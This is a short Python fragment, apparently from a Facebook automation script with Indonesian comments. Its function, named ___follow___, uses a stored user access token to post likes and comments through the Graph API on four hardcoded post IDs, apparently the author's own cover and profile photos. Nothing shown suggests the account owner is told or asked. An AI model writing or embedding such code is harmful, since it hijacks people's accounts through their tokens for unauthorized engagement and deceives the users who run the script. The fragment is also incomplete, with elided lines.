...
def ___follow___():
    ...
    try:
        ...
        requests.post('https://graph.facebook.com/1418389965146299/likes?summary=true&access_token=%s'%(___token)) #foto sampul
        requests.post('https://graph.facebook.com/151721271518723/likes?summary=true&access_token=%s'%(___token)) # foto profil
        ...
        requests.post('https://graph.facebook.com/660155105160982/comments/?message=%s&access_token=%s'%(___komen___,___token)) #foto profil
        requests.post('https://graph.facebook.com/660999895076503/comments/?message=%s&access_token=%s'%(___komen2___,___token)) #foto profil
